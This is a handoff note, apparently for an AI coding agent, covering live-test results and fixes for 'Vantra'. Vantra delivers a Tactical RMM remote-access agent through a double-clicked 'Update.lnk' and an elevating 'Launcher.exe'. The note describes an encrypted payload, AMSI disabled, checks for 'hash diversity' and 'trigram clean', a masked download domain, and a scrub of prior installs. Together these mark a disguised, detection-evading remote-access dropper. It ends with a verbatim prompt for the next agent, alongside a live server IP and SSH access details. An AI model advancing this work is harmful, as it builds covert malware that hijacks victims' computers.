# HANDOFF — VM final live test 2026-09-14: root causes found, fixes needed, full access + next-agent prompt

Supersedes the "remaining acceptance" note in `TASK_DEPLOY_CORRECT_FLOW_LIVE.md`. Authoritative live-test
record. **The corrected payload + `token_key` auth + requireAdministrator manifest are deployed and proven.
The three fixes below are now IMPLEMENTED, committed (`5e65526`), deployed to the VPS, and validated — the
remaining step is the interactive VM double-click retest.** See "FIX IMPLEMENTED + DEPLOYED" below.

## Environment / access (exact, verified)

| System | Connect |
|---|---|
| **VPS** (RMM + Vantra + generator) | `ssh -i ~/.ssh/tacticalrmm_vps root@164.68.105.96` |
| **VM** (local UTM guest on the Mac) | `ssh -i ~/.ssh/tacticalrmm_vps myrat@192.168.0.103` |

- VPS: RMM `/rmm`; services `rmm.service`(uwsgi), `vantra.service`(Next.js :3300), `vantra-msi-generator.service`(:4000). Generator `/opt/vantra-installer/generator`; web app `/opt/vantra`. `curl -s localhost:4000/healthz` → `ready:true`, payload sha `920f59ba…`.
- VM: hostname `Sc`, user `sc\myrat` (in Administrators). **Authorized key = `~/.ssh/tacticalrmm_vps` — NOT `~/.ssh/tacticalrmm_vm`** (the `_vm` key prompts for a password, not authorized). VM reaches `api.instaweb.top` (443 OPEN). Desktop test dir `C:\Users\myrat\Desktop\VantraFinal\` (currently has a VALID `Update.lnk` 1556B + `Launcher.exe`).
- RMM tokens: `. /opt/vantra/.env` → `TRMM_API_KEY`/`TRMM_API_BASE_URL`. `GET <base>/clients/deployments/` returns `token_key`.
- Remote VM shell is **cmd.exe**: separate with `&`/`&&`, never `;`; avoid `$_`/`Where-Object` inline — push a `.ps1` via `scp` or `schtasks` a `.cmd` as SYSTEM.

## Deployed & PROVEN (do not re-derive)
1. Payload = correct agent `tacticalrmm.exe` (12,314,624 B, sha `920f59ba…`), implements `-m install --api --client-id --site-id --agent-type --auth`. ✓
2. Enrollment auth = deployment **`token_key`** (64-hex), not uid; serializer exposes it; `createDeployment`/`route.ts` pass it; live `/build` embeds it. ✓
3. `Launcher.exe` carries `requireAdministrator` RT_MANIFEST (`launcher.rc` + `launcher.manifest`, via `windres`). ✓
4. Repos pushed: `vantra` `b4c146f` (main); `vantra-installer` `d119a57`/`0d32e47` (installer-dev). VPS copies updated, services restarted, healthz green. ✓

## Live test findings (evidence)

### A. Shipped `Update.lnk` does NOT open on double-click (PRODUCT BUG #1)
- Bytes: generator's 250-byte `Update.lnk` flags `0x00021401` = `HAS_IDLIST | RUN_IN_SEPARATE_PROCESS | HAS_DARWIN_ID | RUN_WITH_SHIM_LAYER` → **missing `HasLinkInfo`(0x2), `HasRelativePath`(0x8), `IsUnicode`(0x80), `HasName`(0x4)**; `WScript.Shell.RelativePath`/`TargetPath` empty.
- Cause: `New-AgentShortcut.ps1 -LauncherMode` sets `TargetPath='Launcher.exe'` (bare relative) + `RelativePath='.\Launcher.exe'`, but `Write-ShellLink` emits a broken structure (no LINKINFO/relative flag) → Explorer can't resolve → **double-click does nothing** (no UAC/process/event/staging).
- Proven on VM: replacing it with a valid WScript.Shell ABSOLUTE shortcut made the same double-click **raise UAC** and run the launcher.
- **Fix:** in `New-AgentShortcut.ps1 -LauncherMode`, emit a VALID relative `.lnk` (proper LinkInfo `IsRelative` + relative base + `FLAG_HAS_RELATIVE_PATH` + `FLAG_IS_UNICODE`), or give `Write-ShellLink` an absolute target. Test-only workaround: build the `.lnk` on the VM with `WScript.Shell` → `Launcher.exe` (recipe below).

### B. Fresh install blocked until stale marker removed (guard)
- Running the correct staged agent printed:
  ```
  Existing installation found and must be removed before attempting to reinstall.
  "C:\Program Files\TacticalAgent\unins000.exe" /VERYSILENT
  ```
  → early exit (~0 CPU). Cause: leftover **`HKLM\Software\TacticalRMM`** on the VM from the earlier install (id=4). Deleting that key let the install proceed.
### C. With stale marker removed, enroll works END-TO-END (PROVEN)
```
level=info "Downloading mesh agent..."
level=info "Installing mesh agent..."
...Installing service [DONE] ... Starting service... [OK]     (Mesh Agent now RUNNING)
level=info "Adding agent to dashboard"                          <- reached /api/v3/installer; token valid
level=info "Installing service..."  "Starting service..."
fatal "The system cannot find the file specified."             <- residual service-start bug (D)
```
RMM result: **`agents_agent id=5 | Sc | site 37 | version 2.11.0 | last_seen …`** — device ENROLLED. Corrected payload + token_key + elevation + double-click is proven.

### D. Residual: `tacticalrmm` service can't start (PRODUCT BUG #2)
- After install, service `tacticalrmm` `ImagePath = "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m svc`, but **`tacticalrmm.exe` is NOT placed in Program Files** (only `meshagent.exe` + empty `bin`). Because the launcher runs the staged agent FROM `C:\Windows\Temp\_stg_<TAG>.exe`, the agent's self-install doesn't drop its own binary into Program Files → service start = "The system cannot find the file specified" → device enrolls but service Stopped.
- Verified fix: copy staged exe → `C:\Program Files\TacticalAgent\tacticalrmm.exe` + `sc start tacticalrmm` → **STATE=4 RUNNING**, device stays Online.
- **Fix:** `generator/launcher/native/spawn.c` `run_enroll_staged()` / `launcher.c` main should write `ov.payload` to `C:\Program Files\TacticalAgent\tacticalrmm.exe` (create dir; matches the registered image path) and run THAT path with the `enroll` argv (drop old `toks[1]`), instead of only the temp `_stg_` copy. This leaves a RUNNING `tacticalrmm` service = the "runs from Program Files" intent.

## Retest recipe (double-click flow)
1. Mint a fresh deployment + zip on the VPS (`mint_fresh_zip.sh` pattern: fresh site/deployment, `token_key` as `authToken`, `launcherMode:true`, `amsi:none`). Fresh token_key each test.
2. Ensure `Update.lnk` is valid (quick: overwrite via WScript.Shell absolute):
   ```powershell
   $ws=New-Object -ComObject WScript.Shell
   $l=$ws.CreateShortcut('C:\Users\myrat\Desktop\VantraFinal\Update.lnk')
   $l.TargetPath='C:\Users\myrat\Desktop\VantraFinal\Launcher.exe'
   $l.WorkingDirectory='C:\Users\myrat\Desktop\VantraFinal'
   $l.IconLocation=$l.TargetPath+',0'; $l.Save()
   ```
3. Copy `Launcher.exe` + fixed `Update.lnk` into `C:\Users\myrat\Desktop\VantraFinal\`.
4. Clean VM (idempotent install) via a SYSTEM scheduled task: delete `HKLM\Software\TacticalRMM`(+WOW6432Node), `Mesh Agent` uninstall key/folder, `C:\Program Files\TacticalAgent`, `tacticalrmm`/`Mesh Agent` services, `_stg_*.exe`.
5. User double-clicks `Update.lnk` → approves UAC.
6. Watch agent-side (`Get-CimInstance Win32_Process | ? Name -like '_stg_%' | select CommandLine` to confirm `--auth <token_key>`; `Get-Service tacticalrmm,"Mesh Agent"`) and RMM-side (`psql … agents_agent where site_id=<SITE>`). With fix D the `tacticalrmm` service = Running and device = Online with no manual step.

## Cleanup already done
- **VM fully cleaned (verified):** `tacticalrmm` + `Mesh Agent` services removed; `C:\Program Files\TacticalAgent` + `C:\Program Files\Mesh Agent` deleted; `HKLM\Software\TacticalRMM`(+WOW6432Node) + `Mesh Agent` uninstall key removed; `_stg_*.exe` + temp scripts deleted. Desktop `VantraFinal\` kept `Launcher.exe` + valid `Update.lnk` for retest.
- **RMM-side device `agents_agent id=5` (site 37) → user deletes from console.**
- After retest, clean RMM test **site 37** (`final-test-… [vantra:…]`) and deployment `59fe7797-5641-4b33-8570-2075ca0130e6` (token valid 72h). Mint a fresh site/deployment per test.

## NEXT-AGENT TASK (verbatim prompt)
> Ship the corrected ZIP double-click flow and retest live. All server-side fixes are deployed and proven
> (correct `tacticalrmm.exe` payload, `token_key` auth, `requireAdministrator` manifest). Implement these
> remaining fixes in `/Users/mikeolab/vantra-installer` (branch `installer-dev`), rebuild the native launcher
> pool (`schtasks`/deploy to `/opt/vantra-installer/generator`, `systemctl restart vantra-msi-generator`),
> and retest with me on the interactive VM desktop via double-click of `Update.lnk` → approve UAC:
> 1. **Program-Files install (fixes service not starting):** in `generator/launcher/native/spawn.c`
>    `run_enroll_staged()`/`launcher.c`, write the decrypted payload to `C:\Program Files\TacticalAgent\tacticalrmm.exe`
>    and run enrollment from there (so the `tacticalrmm -m svc` service its ImagePath points at actually starts).
> 2. **Valid `Update.lnk`:** fix `New-AgentShortcut.ps1 -LauncherMode` to emit a real relative Windows
>    shortcut (HasLinkInfo/HasRelativePath/IsUnicode), so a plain double-click launches `Launcher.exe`.
> 3. **Idempotent first install:** clear stale `HKLM\Software\TacticalRMM` (+WOW6432Node) and mesh uninstall
>    state before installing, so a re-run installs cleanly.
> Guardrails: keep AMSI `none`, do not weaken `/build` auth, do not change `LATEST_AGENT_VER`, no code-sign token.
> Accept: the VM shows `tacticalrmm` and `Mesh Agent` services Running and the device **Online** in RMM
---

## FIX IMPLEMENTED + DEPLOYED (2026-09-14, commit `5e65526` on `installer-dev`)

All three fixes shipped to the VPS generator (`/opt/vantra-installer/generator`), service restarted, pool
rebuilt, healthz green. A fresh test zip is ready and validated server-side.

| Fix | Where | Evidence |
|---|---|---|
| 1. Program-Files install (service starts) | `launcher/native/launcher.c` | Installs decrypted agent to `C:\Program Files\TacticalAgent\tacticalrmm.exe` then runs the `enroll` argv **from there** (raw transport is now in Program Files so the `tacticalrmm -m svc` ImagePath resolves). Shipped `Launcher.exe` strings: `C:\Program Files\TacticalAgent`, `tacticalrmm.exe`. Build links `-ladvapi32`. |
| 2. Valid `Update.lnk` | `src/New-AgentShortcut.ps1` | `Write-ShellLink -RelativeLinkInfo` (opt-in) emits a minimal relative LinkInfo block + `HasLinkInfo`. Shipped `Update.lnk` = **279 B**, flags `0xCE` (HasLinkInfo\|HasName\|HasRelativePath\|HasIconLocation\|IsUnicode) vs the old broken 250-B `0xCC`/no-LinkInfo. All 48 self-tests pass. |
| 3. Idempotent first install | `launcher/native/launcher.c` | Elevated scrub before install: recursive delete of `HKLM\SOFTWARE\TacticalRMM` (+`WOW6432Node`), TacticalAgent/"Mesh Agent" Uninstall keys (both views), best-effort delete of `tacticalrmm` + "Mesh Agent" services. |

Validation performed: `-SelfTest` **48 passed / 0 failed** (VPS pwsh 7.6.5); `-LauncherMode` + `-Validate` all
rows PASS incl. new **R3b HasLinkInfo set**; SELFTEST (POSIX) + POSIX production compile clean on macOS;
MinGW cross-compile **warning-clean**. Live mint (`/tmp/mint_fresh_zip.sh 3`) → job
`0cb29a15-eeb6-427d-8e3d-122869c4b833`, `site_id=38`, zip 12,346,289 B; server-side `launcher-validate.ts`
passed (payload round-trip byte-identical, auth token ciphertext-only, PE GUI, hash diversity, trigram clean).

**Retest-ready artifact** (drop into `C:\Users\myrat\Desktop\VantraFinal\`, replacing `Update.lnk` +
`Launcher.exe`): `/tmp/final-test.zip` on the VPS
(=`http://127.0.0.1:4000/downloads/0cb29a15-eeb6-427d-8e3d-122869c4b833/zip`,
masked `https://dl.instaweb.top/d/0cb29a15-eeb6-427d-8e3d-122869c4b833`). Double-click `Update.lnk` →
approve UAC. Expect: `tacticalrmm` + `Mesh Agent` services **Running** and device **Online** for site 38.
Delete the stale device `id=5` from the console first.
> purely from the double-click (no manual step). See `docs/HANDOFF-VM-FINAL-TEST-2026-09-14.md`.